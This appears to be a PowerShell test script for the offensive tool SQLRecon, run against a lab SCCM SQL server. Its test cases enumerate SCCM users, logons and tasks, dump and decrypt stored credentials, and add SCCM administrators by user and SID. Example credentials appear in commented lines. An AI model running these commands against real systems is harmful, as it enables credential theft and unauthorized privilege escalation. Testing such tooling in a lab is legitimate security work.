<#
    Execution instructions:
    powershell.exe -nop -exec bypass .\SQLRecon-SCCM-Modules-Test.ps1
#>

<#
    The $global:* variables do not need to be changed.
    The only exception is $global:modules, which can be
    changed to match the number of test cases you execute.
#>
$global:timeout = 1
$global:count = 1
$global:modules = 10
$global:timestamp = Get-Date -Format "MM-dd-yyyy-HH-mm"

<#
    The $authentication variable acts as a quick way to
    switch the authentication type for the following commands.
#>
$authentication = "WinToken"
#$authentication = "WinDomain /domain:kawalabs /username:admin /password:Password123"
#$authentication = "Local /username:sa /password:Password123"

<#
    The following variables can be changed.
    - $sqlreconPath is the path to where SQLRecon is on disk.
    - $server1 is the hostname or IP of an SCCM SQL server.
    - $database1 is the name of the SCCM database, this will start with a 'CM_'
    - $ouputPath is where you want to output the results of this script on disk in markdown.
      keep in mind that the path can not have special characters like ':'. '-' is fine.
#>
$sqlreconPath = ".\SQLRecon.exe"
$server1 = "MECM01"
$database1 = "CM_KAW"
$authenticationFormatted = $authentication.replace(' ','')
$ouputPath = $PSScriptRoot + "\sqlrecon-sccm-$authenticationFormatted-$global:timestamp.md"

<#
    .Description
    The Execute function executes a supplied SQLRecon command.
#>
Function Execute($command)
{
    Write-Output "($global:count/$global:modules)"
    Write-Output $command
    Write-Output ""
    Write-Output "Output:"
    Write-Output '```'
    Invoke-Expression $command
    Write-Output '```'
    Write-Output ""
    Invoke-Expression "timeout /t $global:timeout" | Out-Null
    $global:count++
}

# Configuring output to file.
$ErrorActionPreference="SilentlyContinue"
Stop-Transcript | out-null
$ErrorActionPreference = "Continue"
Start-Transcript -path $ouputPath

Write-Output "---------------------------------------------------------------------"
Write-Output "[+] SQLRecon - SCCM Modules Test Cases"
Write-Output "[+] Variables Set:"
Write-Output "  |-> SQLRecon Path: $sqlreconPath"
Write-Output "  |-> Ouput Path: $ouputPath"
Write-Output "  |-> Authentication: $authentication"
Write-Output "  |-> SCCM SQL Server: $server1"
Write-Output "  |-> SCCM Database: $database1"
Write-Output "[+] Starting test cases against $modules modules at $global:timestamp"
Write-Output "---------------------------------------------------------------------"
Write-Output ""

# Add test cases in this area. In this case there are 10, which is why $global:modules is set to 10.
Execute "$sqlreconPath /help"
Execute "$sqlreconPath /auth:$authentication /host:$server1 /database:$database1 /module:susers"
Execute "$sqlreconPath /auth:$authentication /host:$server1 /database:$database1 /module:susers /option:'user jm'"
Execute "$sqlreconPath /auth:$authentication /host:$server1 /database:$database1 /module:ssites"
Execute "$sqlreconPath /auth:$authentication /host:$server1 /database:$database1 /module:slogons"
Execute "$sqlreconPath /auth:$authentication /host:$server1 /database:$database1 /module:stasklist"
Execute "$sqlreconPath /auth:$authentication /host:$server1 /database:$database1 /module:staskdata"
Execute "$sqlreconPath /auth:$authentication /host:$server1 /database:$database1 /module:scredentials"
Write-Output ""
Write-Output "[+] Executing Privileged Commands"
Write-Output ""
Execute "$sqlreconPath /auth:$authentication /host:$server1 /database:$database1 /module:sdecryptcredentials"
Execute "$sqlreconPath /auth:$authentication /host:$server1 /database:$database1 /module:saddadmin /user:current /sid:current"
Execute "$sqlreconPath /auth:$authentication /host:$server1 /database:$database1 /module:saddadmin /user:KAWALABS\acon /sid:S-1-5-21-3113994310-608060616-2731373765-1391"
# Execute "$sqlreconPath /auth:$authentication /host:$server1 /database:$database1 /module:sremoveadmin /user: /remove:"
Write-Output "---------------------------------------------------------------------"
Write-Output "[+] SQLRecon - SCCM Modules Test Cases"
Write-Output "[+] Completed test cases against $modules modules at $global:timestamp"
Write-Output "---------------------------------------------------------------------"
Stop-Transcript